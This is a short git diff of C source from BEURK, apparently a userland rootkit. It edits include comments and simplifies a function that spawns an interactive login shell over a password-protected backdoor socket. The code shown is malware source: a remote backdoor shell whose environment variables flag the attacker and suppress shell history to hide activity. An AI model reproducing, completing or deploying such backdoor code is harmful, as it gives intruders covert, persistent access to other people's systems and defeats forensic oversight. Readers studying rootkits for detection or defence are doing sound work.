@@ -18,17 +18,18 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#include <unistd.h>
-#include <string.h>
-#include <stdint.h>
-#include <pty.h>
-#include <errno.h>
-#include <arpa/inet.h>
-#include <sys/socket.h>
-#include <sys/select.h>
+#include <unistd.h> /* read(), close(), ... */
+#include <string.h> /* memset(), strncmp() */
+#include <stdint.h> /* size_t */
+#include <pty.h> /* openpty() */
+#include <errno.h> /* errno globale */
+#include <arpa/inet.h> /* htons() */
+#include <sys/socket.h> /* struct sockaddr */
+#include <sys/select.h> /* select() */
+#include <libgen.h> /* basename() */
 #include "beurk.h" /* prototype */
 #include "debug.h" /* DEBUG() */
-#include "config.h"
+#include "config.h" /* __hidden_literals globale */
 
 
 /** ensure that given password is valid.
@@ -63,7 +64,8 @@ static int  check_shell_password(int sock) {
 }
 
 
-/** close backdoor socket properly and return -1.
+/** close backdoor socket properly and return -1
+ * WARNING: this also shutdowns the socket stream
  */
 static int  close_socket(int sock) {
     shutdown(sock, SHUT_RDWR);
@@ -77,11 +79,7 @@ static int  close_socket(int sock) {
 static void start_interactive_shell(int sock, int *pty, int *tty) {
     DEBUG(D_INFO, "start_interactive_shell() called");
 
-#if DEBUG_LEVEL > 0
-    char * const args[] = {"BEURK_LOGIN_SHELL", "-l", NULL};
-#else
     char * const args[] = {SHELL_TYPE, "-l", NULL};
-#endif
     char * const env[] = {_ENV_IS_ATTACKER, _ENV_NO_HISTFILE, _ENV_XTERM, NULL};
 
     /* close all file descriptors (prevent inheritance) */
